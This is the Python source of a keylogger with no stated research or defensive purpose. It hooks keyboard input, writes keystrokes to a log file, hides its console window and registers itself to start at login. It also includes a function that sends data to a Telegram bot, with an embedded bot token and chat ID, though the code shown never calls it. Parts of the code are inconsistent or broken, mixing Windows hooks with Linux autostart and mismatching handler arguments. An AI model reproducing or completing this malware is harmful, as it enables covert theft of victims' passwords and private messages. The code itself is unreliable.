import os
import sys
import subprocess
import time
from datetime import datetime
import urllib.request
import json

telegram_token = "6285163091:AAEPDAZtSIccvzn8a-wnSI_As89Qh5Kdfvs"
chat_id = "1306881762"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    data = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
    urllib.request.urlopen(req)

def OnKeyPress(event):
    with open(log_file, "a") as f:
        if event.Key == 'P_Enter':
            f.write('\n')
        else:
            f.write(event.Key)

def hook_keyboard():
    import threading
    import ctypes

    def low_level_keyboard_handler(nCode, wParam, lParam):
        if wParam == 0x100:  # WM_KEYDOWN
            hooked_key = chr(lParam[0])
            OnKeyPress(hooked_key)
        return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

    CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
    pointer = CMPFUNC(low_level_keyboard_handler)
    hook_id = ctypes.windll.user32.SetWindowsHookExA(13, pointer, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
    msg = ctypes.wintypes.MSG()
    ctypes.windll.user32.GetMessageA(ctypes.byref(msg), 0, 0, 0)

def main():
    global log_file
    log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    hook_keyboard()

    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        pass

def hide_console():
    if os.name == 'nt':
        import win32console
        import win32gui
        win32console.GetConsoleWindow()
        win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)

def add_to_startup():
    startup_file = os.path.expanduser("~/.config/autostart/keylogger.desktop")
    with open(startup_file, "w") as f:
        f.write("[Desktop Entry]\n")
        f.write("Type=Application\n")
        f.write(f"Exec=python3 {os.path.realpath(__file__)}\n")
        f.write("Hidden=false\n")
        f.write("NoDisplay=false\n")
        f.write("X-GNOME-Autostart-enabled=true\n")
        f.write("Name[en_US]=Keylogger\n")
        f.write("Name=Keylogger\n")
        f.write("Comment=Start keylogger at system startup\n")

if __name__ == "__main__":
    hide_console()
    add_to_startup()
    main()